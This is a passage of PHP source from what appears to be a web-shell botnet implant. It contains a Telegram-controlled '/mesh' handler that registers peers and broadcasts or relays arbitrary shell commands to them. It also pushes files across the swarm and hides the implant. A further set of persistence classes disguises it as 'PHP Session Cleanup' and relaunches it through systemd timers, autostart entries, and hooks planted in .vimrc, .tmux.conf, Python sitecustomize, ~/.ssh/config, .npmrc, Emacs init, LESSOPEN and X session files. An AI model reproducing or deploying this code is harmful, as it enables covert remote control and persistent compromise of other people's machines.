        elseif($w==='rotate'){$nk=mesh_key_gen();mesh_key_set($nk);$ok=0;$fl=0;foreach($peers as $x){$r=mesh_http($x['url']??'','rotate_key',['new_key'=>$nk],10);if(!empty($r['rotated']))$ok++;else $fl++;}wn_send($BOT,$CHAT,"[MESH] Rotated\n$nk\nOK $ok / FAIL $fl");}
        else wn_send($BOT,$CHAT,$key===''?'[MESH] NOT SET':'[MESH] Key: '.substr($key,0,8));
        return;
    }
    if($sub==='add'){
        if($key===''){wn_send($BOT,$CHAT,"[X] /mesh key gen first");return;}
        $u=$p[1]??'';if(!preg_match('#^https?://#',$u)){wn_send($BOT,$CHAT,"[X] /mesh add <url>");return;}
        global $__B;$sig=hash_hmac('sha256','mesh_boot:'.$key,$__B);
        $sep=strpos($u,'?')===false?'?':'&';
        $boot=$u.$sep.'wn_mesh=1&op=register_bootstrap&new_key='.urlencode($key).'&sig='.urlencode($sig);
        $rj=@json_decode(mesh_http_raw($boot,15),true);
        if(!is_array($rj)||empty($rj['ok'])){$pj=mesh_http($u,'ping',[],10);if(empty($pj['pong'])){wn_send($BOT,$CHAT,"[X] ".(($rj['error']??$pj['error']??'?')));return;}$rj=$pj;}
        $pid=$rj['id']??'';if($pid===''){wn_send($BOT,$CHAT,"[X] no id");return;}
        mesh_upsert_peer($pid,$u,['added_via'=>'telegram']);
        mesh_http($u,'gossip',['peers'=>json_encode(mesh_peers())],15);
        wn_send($BOT,$CHAT,"[MESH] Added: $pid\nTotal: ".count(mesh_peers()));
        return;
    }
    if($sub==='rm'){$t=$p[1]??'';if($t===''){wn_send($BOT,$CHAT,"[X] /mesh rm <id>");return;}$b=count($peers);$peers=array_values(array_filter($peers,function($x)use($t){return ($x['id']??'')!==$t&&($x['url']??'')!==$t;}));mesh_save_peers($peers);wn_send($BOT,$CHAT,"[MESH] Removed ".($b-count($peers)));return;}
    if($sub==='peers'){
        if(empty($peers)){wn_send($BOT,$CHAT,"[MESH] no peers");return;}
        $m="MESH PEERS (".count($peers).")\n\n";foreach($peers as $i=>$x){$age=time()-(int)($x['last_seen']??0);$r=$x['role']??'?';$m.=($i+1).". ".($x['id']??'?')." [$r]\n   ".($x['url']??'?')."\n   ".($x['last_status']??'?')." ({$age}s)\n";}
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='ping'){
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $m="MESH PING\n\n";$upd=[];
        foreach($peers as $x){$r=mesh_http($x['url']??'','ping',[],10);
            if(!empty($r['pong'])){$x['last_status']='ok';$x['last_seen']=time();$x['role']=$r['role']??'speaker';$m.="OK   ".substr($x['id']??'?',0,8)." (".($r['peer_count']??0)." peers, ".($r['role']??'?').")\n";}
            else{$x['last_status']='unreachable';$m.="FAIL ".substr($x['id']??'?',0,8)." ".($r['error']??'?')."\n";}
            $upd[]=$x;}
        mesh_save_peers($upd);wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='gossip'){
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $tot=0;foreach($peers as $x){$r=mesh_http($x['url']??'','gossip',['peers'=>json_encode(mesh_peers())],15);$tot+=(int)($r['new_added']??0);}
        wn_send($BOT,$CHAT,"[MESH] Gossip\nNew: $tot\nTotal: ".count(mesh_peers()));return;
    }
    if($sub==='exec'){
        $cmd=trim(substr((string)$args,strlen($p[0])));
        if($cmd===''){wn_send($BOT,$CHAT,"[X] /mesh exec <cmd>");return;}
        if(empty($peers)){wn_send($BOT,$CHAT,"no peers");return;}
        $tid=bin2hex(random_bytes(8));
        $m="MESH EXEC\n$ $cmd\nID: $tid\n\n";
        $m.="-- self (".substr($id,0,8).") --\n".substr((string)cmd_exec($cmd),0,400)."\n\n";
        $seen=mesh_seen_load();$seen[]=$tid;if(count($seen)>200)$seen=array_slice($seen,-200);mesh_seen_save($seen);
        foreach($peers as $x){
            $r=mesh_http($x['url']??'','broadcast',['task_id'=>$tid,'cmd'=>$cmd,'ttl'=>3],20);
            $m.="-- ".substr($x['id']??'?',0,8)." --\n";
            if(!empty($r['executed']))$m.=substr((string)($r['output']??''),0,400);
            elseif(!empty($r['skipped']))$m.="(skipped)";
            else $m.="FAIL ".($r['error']??'?');
            $m.="\n\n";
        }
        wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='relay'){
        $target=$p[1]??'';$cmd=trim(substr((string)$args,strlen($p[0])+strlen($target)+2));
        if($target===''||$cmd===''){wn_send($BOT,$CHAT,"[X] /mesh relay <id> <cmd>");return;}
        $direct=null;foreach($peers as $x)if(($x['id']??'')===$target){$direct=$x;break;}
        if($direct){$r=mesh_http($direct['url']??'','exec',['cmd'=>$cmd],20);
            if(isset($r['output'])){wn_send($BOT,$CHAT,"[RELAY→".substr($target,0,8)."]\n$ $cmd\n\n".substr((string)$r['output'],0,3000));return;}}
        foreach($peers as $hop){if(($hop['id']??'')===$target)continue;
            $r=mesh_http($hop['url']??'','relay',['target_id'=>$target,'cmd'=>$cmd,'hops'=>0],20);
            if(!empty($r['relay_result']['output'])){wn_send($BOT,$CHAT,"[RELAY via ".substr($hop['id']??'?',0,8)."→".substr($target,0,8)."]\n$ $cmd\n\n".substr((string)$r['relay_result']['output'],0,3000));return;}}
        wn_send($BOT,$CHAT,"[X] Relay failed");return;
    }
    if($sub==='put'){
        $dest=trim(substr((string)$args,strlen($p[0])));
        if($dest===''){wn_send($BOT,$CHAT,"[X] /mesh put <dest-path>");return;}
        wn_send($BOT,$CHAT,"[MESH] Reply file dengan caption:\n/mesh put $dest");
        return;
    }
    if($sub==='observe'){
        $w=strtolower($p[1]??'');
        if($w==='on'){mesh_role_set('observer');wn_send($BOT,$CHAT,"[MESH] ROLE: OBSERVER");}
        elseif($w==='off'){mesh_role_set('speaker');wn_send($BOT,$CHAT,"[MESH] ROLE: SPEAKER");}
        else wn_send($BOT,$CHAT,"[MESH] Role: ".strtoupper($role)."\n/mesh observe on|off");
        return;
    }
    if($sub==='install'){
        $t=$p[1]??'';
        if($t===''){wn_send($BOT,$CHAT,"[X] /mesh install <id>");return;}
        $x=null;foreach($peers as $sv)if(($sv['id']??'')===$t||($sv['url']??'')===$t){$x=$sv;break;}
        if(!$x){wn_send($BOT,$CHAT,"[X] not found");return;}
        $r=mesh_http($x['url'],'install',['silent'=>'1'],120);
        wn_send($BOT,$CHAT,!empty($r['install']['status'])&&$r['install']['status']==='success'?"[MESH] installed ".substr($t,0,8):"[X] ".json_encode($r['install']??$r));
        return;
    }
    if($sub==='hide'){
        if(empty($peers)){wn_send($BOT,$CHAT,"[X] no peers");return;}
        $m="MESH HIDE\n\n";$ok=0;$fl=0;
        foreach($peers as $x){$r=mesh_http($x['url'],'hide',[],30);
            if(!empty($r['hidden'])){$ok++;$m.="OK   ".substr($x['id']??'?',0,8)."\n";}
            else{$fl++;$m.="FAIL ".substr($x['id']??'?',0,8)." ".($r['error']??'?')."\n";}}
        $m.="\nOK $ok / FAIL $fl";wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='unhide'){
        if(empty($peers)){wn_send($BOT,$CHAT,"[X] no peers");return;}
        $m="MESH UNHIDE\n\n";$ok=0;$fl=0;
        foreach($peers as $x){$r=mesh_http($x['url'],'unhide',[],30);
            if(isset($r['hidden'])&&$r['hidden']===false){$ok++;$m.="OK   ".substr($x['id']??'?',0,8)."\n";}
            else{$fl++;$m.="FAIL ".substr($x['id']??'?',0,8)."\n";}}
        $m.="\nOK $ok / FAIL $fl";wn_send($BOT,$CHAT,$m);return;
    }
    if($sub==='topology'){
        $m="MESH TOPOLOGY\n\n[".substr($id,0,8)."] ← self (".strtoupper($role).")\n";
        if(empty($peers))$m.="  (no peers)";
        foreach($peers as $x){$via=$x['via']??($x['added_via']??'direct');$r=$x['role']??'?';$m.="  ├─ [".substr($x['id']??'?',0,8)."] ".strtoupper($r)." via $via\n";}
        wn_send($BOT,$CHAT,$m);return;
    }
    wn_send($BOT,$CHAT,"MESH:\n\n/mesh status\n/mesh key gen|set|rotate\n/mesh add <url>\n/mesh rm <id>\n/mesh peers\n/mesh ping\n/mesh gossip\n/mesh exec <cmd>\n/mesh relay <id> <cmd>\n/mesh put <path>\n/mesh observe on|off\n/mesh install <id>\n/mesh hide\n/mesh unhide\n/mesh topology");
}
function swarm_distribute($filePath,$destPath,$BOT,$CHAT){
    if(!file_exists($filePath)||!is_readable($filePath)){wn_send($BOT,$CHAT,"[SWARM] File not readable");return false;}
    $size=@filesize($filePath);if($size===false||$size<=0){wn_send($BOT,$CHAT,"[SWARM] Empty");return false;}
    if($size>20*1024*1024){wn_send($BOT,$CHAT,"[SWARM] >20MB");return false;}
    $raw=@file_get_contents($filePath);if($raw===false){wn_send($BOT,$CHAT,"[SWARM] Read failed");return false;}
    $b64=wn_call('b64e',$raw);$fname=basename($filePath);
    if(substr($destPath,-1)==='/')$destPath=rtrim($destPath,'/').'/'.$fname;
    $peers=swarm_peers();$myId=swarm_id();
    $m="[SWARM PUT]\n$ ".basename($destPath)."\n".formatSize($size)."\n\n";
    $ok=0;$fail=0;
    global $specialDirectories,$rootPath;
    $allowed=isSafePath($destPath,$rootPath,$specialDirectories);
    if(!$allowed){foreach($specialDirectories as $d){if($d&&strpos($destPath,$d)===0){$allowed=true;break;}}}
    if($allowed){
        $dir=dirname($destPath);if(!is_dir($dir))@mkdir($dir,0755,true);
        if(is_dir($dir)&&is_writable($dir)&&wn_call('fpc',$destPath,$raw)!==false){@chmod($destPath,0644);$m.="OK   ".substr($myId,0,8)." (self)\n";$ok++;}
        else{$m.="FAIL ".substr($myId,0,8)." (self)\n";$fail++;}
    }else{$m.="SKIP ".substr($myId,0,8)." (unsafe)\n";$fail++;}
    foreach($peers as $x){
        $r=swarm_http($x['url']??'','put_file',['dest'=>$destPath,'file_b64'=>$b64,'fname'=>$fname],60);
        $pid=substr($x['id']??'?',0,8);
        if(!empty($r['saved'])){$m.="OK   $pid (".formatSize((int)($r['size']??0)).")\n";$ok++;}
        else{$m.="FAIL $pid ".($r['error']??'?')."\n";$fail++;}
    }
    $m.="\nOK $ok / FAIL $fail / Total ".(1+count($peers));
    wn_send($BOT,$CHAT,$m);
    return['ok'=>$ok,'fail'=>$fail];
}
/* ═══════════════════════════════════════════
   LAYER PART 4 — 10 layer smart non-root
   ═══════════════════════════════════════════ */

class WnSystemdTimerLayer extends WnBaseLayer {
    public function key() { return 'systemd_timer'; }
    private function base() { return 'php-session-' . substr(md5(wn_get_key('st')), 0, 8); }
    public function install(array $ctx) {
        $dir = $ctx['home'] . '/.config/systemd/user';
        if (!is_dir($dir)) @mkdir($dir, 0700, true);
        if (!is_dir($dir) || !is_writable($dir)) return ['ok'=>false,'detail'=>'dir not writable'];
        $b = $this->base(); $php = $ctx['php_bin']; $entry = $ctx['entry'];
        $svc = "[Unit]\nDescription=PHP Session Cleanup\nAfter=default.target\n\n[Service]\nType=oneshot\nExecStart={$php} {$entry}\n";
        $tim = "[Unit]\nDescription=Cleanup Timer\n\n[Timer]\nOnBootSec=3min\nOnUnitActiveSec=20min\nPersistent=true\nUnit={$b}.service\n\n[Install]\nWantedBy=timers.target\n";
        $sp = $dir . '/' . $b . '.service'; $tp = $dir . '/' . $b . '.timer';
        $okS = wn_call('fpc', $sp, $svc) !== false; if ($okS) @chmod($sp, 0600);
        $okT = wn_call('fpc', $tp, $tim) !== false; if ($okT) @chmod($tp, 0600);
        if (is_shell_available()) {
            cmd_exec('systemctl --user daemon-reload 2>/dev/null');
            cmd_exec('systemctl --user enable --now ' . escapeshellarg($b . '.timer') . ' 2>/dev/null');
        }
        return ['ok'=>$okS && $okT, 'detail'=>($okS && $okT) ? 'timer active' : 'write fail'];
    }
    public function uninstall(array $ctx) {
        $dir = $ctx['home'] . '/.config/systemd/user'; $b = $this->base(); $r = 0;
        if (is_shell_available()) {
            cmd_exec('systemctl --user stop ' . escapeshellarg($b . '.timer') . ' 2>/dev/null');
            cmd_exec('systemctl --user disable ' . escapeshellarg($b . '.timer') . ' 2>/dev/null');
        }
        foreach (['.service', '.timer'] as $e) { $p = $dir . '/' . $b . $e; if (file_exists($p)) { @unlink($p); $r++; } }
        if (is_shell_available()) cmd_exec('systemctl --user daemon-reload 2>/dev/null');
        return ['ok'=>true,'removed'=>$r];
    }
    public function status(array $ctx) {
        $b = $this->base(); $p = $ctx['home'] . '/.config/systemd/user/' . $b . '.timer';
        if (!file_exists($p)) return ['active'=>false,'detail'=>'missing'];
        $a = is_shell_available() && trim((string)cmd_exec('systemctl --user is-active ' . escapeshellarg($b . '.timer') . ' 2>/dev/null')) === 'active';
        return ['active'=>$a,'detail'=>$a ? 'active' : 'inactive'];
    }
}

class WnXdgAutostartLayer extends WnBaseLayer {
    public function key() { return 'xdg_autostart'; }
    private function fn() { return 'php-session-' . substr(md5(wn_get_key('xd')), 0, 8) . '.desktop'; }
    public function install(array $ctx) {
        $dir = $ctx['home'] . '/.config/autostart';
        if (!is_dir($dir)) @mkdir($dir, 0700, true);
        if (!is_dir($dir) || !is_writable($dir)) return ['ok'=>false,'detail'=>'dir'];
        $f = $dir . '/' . $this->fn();
        $c = "[Desktop Entry]\nType=Application\nName=PHP Session Cleanup\nExec=" . escapeshellarg($ctx['php_bin']) . " " . escapeshellarg($ctx['entry']) . "\nX-GNOME-Autostart-enabled=true\nHidden=false\nNoDisplay=true\nTerminal=false\n";
        $ok = wn_call('fpc', $f, $c) !== false; if ($ok) @chmod($f, 0600);
        return ['ok'=>$ok,'detail'=>$ok ? 'installed' : 'write fail'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.config/autostart/' . $this->fn();
        if (file_exists($f)) { @unlink($f); return ['ok'=>true,'removed'=>1]; }
        return ['ok'=>true,'removed'=>0];
    }
    public function status(array $ctx) { return ['active'=>file_exists($ctx['home'] . '/.config/autostart/' . $this->fn()),'detail'=>'checked']; }
}

class WnTmuxHookLayer extends WnBaseLayer {
    public function key() { return 'tmux_hook'; }
    private function marker() { return '# ' . substr(md5('wn_tmux_' . wn_get_key('tmx')), 0, 12); }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry'];
        $f = $home . '/.tmux.conf'; $m = $this->marker();
        if (file_exists($f)) { $c = @file_get_contents($f); if ($c !== false && strpos($c, $m) !== false) return ['ok'=>true,'detail'=>'already present']; }
        $line = "run-shell 'pgrep -f \"$entry\" >/dev/null 2>&1 || (php \"$entry\" >/dev/null 2>&1 &)'";
        if (@file_put_contents($f, "\n" . $m . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) { @chmod($f, 0600); return ['ok'=>true,'detail'=>'appended']; }
        return ['ok'=>false,'detail'=>'write fail'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.tmux.conf'; if (!file_exists($f)) return ['ok'=>true,'removed'=>0];
        $c = @file_get_contents($f); $m = $this->marker(); if ($c === false || strpos($c, $m) === false) return ['ok'=>true,'removed'=>0];
        $lines = explode("\n", $c); $out = []; $skip = 0;
        foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $m) !== false) { $skip = 1; continue; } $out[] = $l; }
        @file_put_contents($f, implode("\n", $out));
        return ['ok'=>true,'removed'=>1];
    }
    public function status(array $ctx) { $f = $ctx['home'] . '/.tmux.conf'; return ['active'=>file_exists($f) && strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked']; }
}

class WnVimRcLayer extends WnBaseLayer {
    public function key() { return 'vim_rc'; }
    private function marker() { return '" ' . substr(md5('wn_vim_' . wn_get_key('vim')), 0, 12); }
    public function install(array $ctx) {
        $f = $ctx['home'] . '/.vimrc'; $m = $this->marker(); $entry = $ctx['entry'];
        $block = "\n" . $m . "\n" . "if !exists('g:wn_loaded')\n  let g:wn_loaded = 1\n  silent! call system('pgrep -f \"$entry\" >/dev/null 2>&1 || (php \"$entry\" >/dev/null 2>&1 &)')\nendif\n";
        if (file_exists($f)) { $c = @file_get_contents($f); if ($c !== false && strpos($c, $m) !== false) return ['ok'=>true,'detail'=>'already present']; }
        if (@file_put_contents($f, $block, FILE_APPEND | LOCK_EX) !== false) { @chmod($f, 0600); return ['ok'=>true,'detail'=>'appended']; }
        return ['ok'=>false,'detail'=>'write fail'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.vimrc'; if (!file_exists($f)) return ['ok'=>true,'removed'=>0];
        $c = @file_get_contents($f); $m = $this->marker(); if ($c === false || strpos($c, $m) === false) return ['ok'=>true,'removed'=>0];
        $lines = explode("\n", $c); $out = []; $skip = 0;
        foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $m) !== false) { $skip = 4; continue; } $out[] = $l; }
        @file_put_contents($f, implode("\n", $out));
        return ['ok'=>true,'removed'=>1];
    }
    public function status(array $ctx) { $f = $ctx['home'] . '/.vimrc'; return ['active'=>file_exists($f) && strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked']; }
}

class WnPythonSiteLayer extends WnBaseLayer {
    public function key() { return 'python_site'; }
    private function marker() { return '# wn_py_' . substr(md5(wn_get_key('py')), 0, 8); }
    private function shim($entry) {
        $e = addslashes($entry);
        $code = "try:\\n import subprocess as _s\\n (_s.call(['pgrep','-f','$e'],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))!=0) and _s.Popen(['php','$e'],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'),start_new_session=True)\\nexcept Exception: pass";
        return $this->marker() . "\nexec(\"" . $code . "\")\n";
    }
    public function install(array $ctx) {
        $home = $ctx['home']; $dirs = glob($home . '/.local/lib/python3.*', GLOB_ONLYDIR) ?: [];
        if (empty($dirs)) {
            $ver = trim((string)cmd_exec('python3 -c "import sys;print(f\'python{sys.version_info.major}.{sys.version_info.minor}\')" 2>/dev/null'));
            if (!$ver) $ver = 'python3';
            $d = $home . '/.local/lib/' . $ver . '/site-packages';
            if (!is_dir($d)) @mkdir($d, 0700, true);
            if (is_dir($d)) $dirs[] = dirname($d);
        }
        $n = 0; $shim = $this->shim($ctx['entry']);
        foreach ($dirs as $d) {
            foreach ([$d . '/sitecustomize.py', $d . '/site-packages/sitecustomize.py'] as $f) {
                $existing = file_exists($f) ? @file_get_contents($f) : '';
                if ($existing !== false && strpos($existing, $this->marker()) !== false) { $n++; break; }
                if (file_exists($f) && !is_writable($f)) continue;
                $dir = dirname($f); if (!is_dir($dir)) @mkdir($dir, 0700, true);
                if (!is_dir($dir) || !is_writable($dir)) continue;
                $content = ($existing !== false && $existing !== '') ? $existing . "\n" . $shim : $shim;
                if (@file_put_contents($f, $content) !== false) { @chmod($f, 0600); $n++; break; }
            }
        }
        return ['ok'=>$n > 0,'detail'=>"$n sitecustomize"];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $dirs = glob($home . '/.local/lib/python3.*', GLOB_ONLYDIR) ?: []; $n = 0;
        foreach ($dirs as $d) {
            foreach ([$d . '/sitecustomize.py', $d . '/site-packages/sitecustomize.py'] as $f) {
                if (!file_exists($f) || !is_writable($f)) continue;
                $c = @file_get_contents($f); if ($c === false || strpos($c, $this->marker()) === false) continue;
                $lines = explode("\n", $c); $out = []; $skip = 0;
                foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $this->marker()) !== false) { $skip = 1; continue; } $out[] = $l; }
                @file_put_contents($f, implode("\n", $out)); $n++;
            }
        }
        return ['ok'=>true,'removed'=>$n];
    }
    public function status(array $ctx) {
        $dirs = glob($ctx['home'] . '/.local/lib/python3.*', GLOB_ONLYDIR) ?: []; $n = 0;
        foreach ($dirs as $d) foreach ([$d . '/sitecustomize.py', $d . '/site-packages/sitecustomize.py'] as $f) if (file_exists($f) && strpos((string)@file_get_contents($f), $this->marker()) !== false) { $n++; break; }
        return ['active'=>$n > 0,'count'=>$n,'detail'=>"$n shims"];
    }
}

class WnSshConfigLayer extends WnBaseLayer {
    public function key() { return 'ssh_config'; }
    private function marker() { return '# wn_ssh_' . substr(md5(wn_get_key('shc')), 0, 8); }
    public function install(array $ctx) {
        $home = $ctx['home']; $sshDir = $home . '/.ssh';
        if (!is_dir($sshDir)) @mkdir($sshDir, 0700, true);
        if (!is_dir($sshDir) || !is_writable($sshDir)) return ['ok'=>false,'detail'=>'ssh dir'];
        $f = $sshDir . '/config'; $m = $this->marker(); $entry = $ctx['entry'];
        $block = "\n" . $m . "\n" . "Host *\n    PermitLocalCommand yes\n    LocalCommand sh -c 'pgrep -f \"$entry\" >/dev/null 2>&1 || (php \"$entry\" >/dev/null 2>&1 &); true'\n";
        if (file_exists($f)) {
            $c = @file_get_contents($f);
            if ($c !== false && strpos($c, $m) !== false) return ['ok'=>true,'detail'=>'already present'];
            if (!is_writable($f)) return ['ok'=>false,'detail'=>'not writable'];
            if (@file_put_contents($f, $block, FILE_APPEND | LOCK_EX) !== false) { @chmod($f, 0600); return ['ok'=>true,'detail'=>'appended']; }
            return ['ok'=>false,'detail'=>'append fail'];
        }
        if (@file_put_contents($f, $block) !== false) { @chmod($f, 0600); return ['ok'=>true,'detail'=>'created']; }
        return ['ok'=>false,'detail'=>'create fail'];
    }
    public function uninstall(array $ctx) {
        $f = $ctx['home'] . '/.ssh/config'; if (!file_exists($f)) return ['ok'=>true,'removed'=>0];
        $c = @file_get_contents($f); $m = $this->marker(); if ($c === false || strpos($c, $m) === false) return ['ok'=>true,'removed'=>0];
        $lines = explode("\n", $c); $out = []; $skip = 0;
        foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $m) !== false) { $skip = 4; continue; } $out[] = $l; }
        @file_put_contents($f, implode("\n", $out));
        return ['ok'=>true,'removed'=>1];
    }
    public function status(array $ctx) {
        $f = $ctx['home'] . '/.ssh/config';
        return ['active'=>file_exists($f) && strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked'];
    }
}

class WnNpmrcLayer extends WnBaseLayer {
    public function key() { return 'npmrc'; }
    private function shimPath() { return wn_state_dir() . '/.wn_npm_shim.sh'; }
    public function install(array $ctx) {
        $entry = $ctx['entry']; $shim = $this->shimPath();
        $shimCode = "#!/bin/sh\n[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg($entry) . " >/dev/null 2>&1 || (php " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }\nexec /bin/sh \"\$@\"\n";
        if (wn_call('fpc', $shim, $shimCode) === false) return ['ok'=>false,'detail'=>'shim write fail'];
        @chmod($shim, 0700);
        $npmrc = $ctx['home'] . '/.npmrc';
        $existing = file_exists($npmrc) ? (string)@file_get_contents($npmrc) : '';
        if (stripos($existing, 'script-shell') !== false) return ['ok'=>false,'detail'=>'script-shell already set'];
        $line = "script-shell=" . $shim . "\n";
        if (@file_put_contents($npmrc, $existing . ($existing && substr($existing, -1) !== "\n" ? "\n" : '') . $line) !== false) {
            @chmod($npmrc, 0600); return ['ok'=>true,'detail'=>'installed'];
        }
        return ['ok'=>false,'detail'=>'write fail'];
    }
    public function uninstall(array $ctx) {
        $npmrc = $ctx['home'] . '/.npmrc'; $shim = $this->shimPath(); $r = 0;
        if (file_exists($npmrc)) {
            $c = @file_get_contents($npmrc);
            if ($c !== false && stripos($c, 'script-shell=') !== false) {
                $lines = array_filter(explode("\n", $c), function($l) { return stripos($l, 'script-shell=') === false; });
                @file_put_contents($npmrc, implode("\n", $lines)); $r++;
            }
        }
        if (file_exists($shim)) { @unlink($shim); $r++; }
        return ['ok'=>true,'removed'=>$r];
    }
    public function status(array $ctx) {
        $npmrc = $ctx['home'] . '/.npmrc';
        return ['active'=>file_exists($npmrc) && stripos((string)@file_get_contents($npmrc), 'script-shell=') !== false,'detail'=>'checked'];
    }
}

class WnEmacsRcLayer extends WnBaseLayer {
    public function key() { return 'emacs_rc'; }
    private function marker() { return ';; ' . substr(md5('wn_emacs_' . wn_get_key('em')), 0, 12); }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry']; $m = $this->marker();
        $block = "\n" . $m . "\n" . "(when (not (getenv \"WN_EMACS_LOADED\"))\n  (setenv \"WN_EMACS_LOADED\" \"1\")\n  (start-process \"wn-trigger\" nil \"sh\" \"-c\" \"pgrep -f '" . $entry . "' >/dev/null 2>&1 || (php '" . $entry . "' >/dev/null 2>&1 &)\"))\n";
        $n = 0;
        foreach ([$home . '/.emacs', $home . '/.emacs.d/init.el'] as $f) {
            $dir = dirname($f); if (!is_dir($dir)) @mkdir($dir, 0700, true);
            if (!is_dir($dir) || !is_writable($dir)) continue;
            if (file_exists($f)) { $c = @file_get_contents($f); if ($c !== false && strpos($c, $m) !== false) { $n++; continue; } if (!is_writable($f)) continue; }
            if (@file_put_contents($f, $block, FILE_APPEND | LOCK_EX) !== false) { @chmod($f, 0600); $n++; }
        }
        return ['ok'=>$n > 0,'detail'=>"$n file(s)"];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $m = $this->marker(); $n = 0;
        foreach ([$home . '/.emacs', $home . '/.emacs.d/init.el'] as $f) {
            if (!file_exists($f) || !is_writable($f)) continue;
            $c = @file_get_contents($f); if ($c === false || strpos($c, $m) === false) continue;
            $lines = explode("\n", $c); $out = []; $skip = 0;
            foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $m) !== false) { $skip = 4; continue; } $out[] = $l; }
            @file_put_contents($f, implode("\n", $out)); $n++;
        }
        return ['ok'=>true,'removed'=>$n];
    }
    public function status(array $ctx) {
        $home = $ctx['home']; $m = $this->marker();
        foreach ([$home . '/.emacs', $home . '/.emacs.d/init.el'] as $f) if (file_exists($f) && strpos((string)@file_get_contents($f), $m) !== false) return ['active'=>true,'detail'=>'active'];
        return ['active'=>false,'detail'=>'off'];
    }
}

class WnLessfilterLayer extends WnBaseLayer {
    public function key() { return 'lessfilter'; }
    private function marker() { return '# wn_less_' . substr(md5(wn_get_key('less')), 0, 8); }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry']; $m = $this->marker();
        $f = $home . '/.lessfilter';
        $code = "#!/bin/sh\n" . $m . "\npgrep -f " . escapeshellarg($entry) . " >/dev/null 2>&1 || (php " . escapeshellarg($entry) . " >/dev/null 2>&1 &)\n[ -x /usr/bin/lesspipe ] && exec /usr/bin/lesspipe \"\$1\"\ncat \"\$1\" 2>/dev/null\n";
        if (wn_call('fpc', $f, $code) === false) return ['ok'=>false,'detail'=>'write fail'];
        @chmod($f, 0700);
        $bashrc = $home . '/.bashrc'; $marker = '# wn_lessenv_' . substr(md5(wn_get_key('lessenv')), 0, 8);
        if (file_exists($bashrc) && is_writable($bashrc)) {
            $c = @file_get_contents($bashrc);
            if ($c !== false && strpos($c, $marker) === false) {
                $env = "\n" . $marker . "\nexport LESSOPEN=\"|" . $f . " %s\"\n";
                @file_put_contents($bashrc, $env, FILE_APPEND | LOCK_EX);
            }
        }
        return ['ok'=>true,'detail'=>'installed'];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $r = 0;
        $f = $home . '/.lessfilter'; if (file_exists($f)) { @unlink($f); $r++; }
        $bashrc = $home . '/.bashrc'; $marker = '# wn_lessenv_' . substr(md5(wn_get_key('lessenv')), 0, 8);
        if (file_exists($bashrc) && is_writable($bashrc)) {
            $c = @file_get_contents($bashrc);
            if ($c !== false && strpos($c, $marker) !== false) {
                $lines = explode("\n", $c); $out = []; $skip = 0;
                foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $marker) !== false) { $skip = 1; continue; } $out[] = $l; }
                @file_put_contents($bashrc, implode("\n", $out)); $r++;
            }
        }
        return ['ok'=>true,'removed'=>$r];
    }
    public function status(array $ctx) {
        $f = $ctx['home'] . '/.lessfilter';
        return ['active'=>file_exists($f) && strpos((string)@file_get_contents($f), $this->marker()) !== false,'detail'=>'checked'];
    }
}

class WnXSessionRcLayer extends WnBaseLayer {
    public function key() { return 'xsession_rc'; }
    private function marker() { return '# wn_xs_' . substr(md5(wn_get_key('xs')), 0, 8); }
    public function install(array $ctx) {
        $home = $ctx['home']; $entry = $ctx['entry']; $m = $this->marker(); $n = 0;
        $line = "[ -f " . escapeshellarg($entry) . " ] && { pgrep -f " . escapeshellarg($entry) . " >/dev/null 2>&1 || (php " . escapeshellarg($entry) . " >/dev/null 2>&1 &); }";
        foreach ([$home . '/.xsessionrc', $home . '/.xprofile'] as $f) {
            if (file_exists($f)) {
                $c = @file_get_contents($f);
                if ($c !== false && strpos($c, $m) !== false) { $n++; continue; }
                if (!is_writable($f)) continue;
            }
            if (@file_put_contents($f, "\n" . $m . "\n" . $line . "\n", FILE_APPEND | LOCK_EX) !== false) { @chmod($f, 0600); $n++; }
        }
        return ['ok'=>$n > 0,'detail'=>"$n file(s)"];
    }
    public function uninstall(array $ctx) {
        $home = $ctx['home']; $m = $this->marker(); $n = 0;
        foreach ([$home . '/.xsessionrc', $home . '/.xprofile'] as $f) {
            if (!file_exists($f) || !is_writable($f)) continue;
            $c = @file_get_contents($f); if ($c === false || strpos($c, $m) === false) continue;
            $lines = explode("\n", $c); $out = []; $skip = 0;
            foreach ($lines as $l) { if ($skip > 0) { $skip--; continue; } if (strpos($l, $m) !== false) { $skip = 1; continue; } $out[] = $l; }
            @file_put_contents($f, implode("\n", $out)); $n++;
        }
        return ['ok'=>true,'removed'=>$n];
    }
    public function status(array $ctx) {
        $home = $ctx['home']; $m = $this->marker();
        foreach ([$home . '/.xsessionrc', $home . '/.xprofile'] as $f) if (file_exists($f) && strpos((string)@file_get_contents($f), $m) !== false) return ['active'=>true,'detail'=>'active'];
        return ['active'=>false,'detail'=>'off'];
    }
}

/* ═══════════════════════════════════════════
   LAYER PART 5 — 2 layer world-first
   ═══════════════════════════════════════════ */

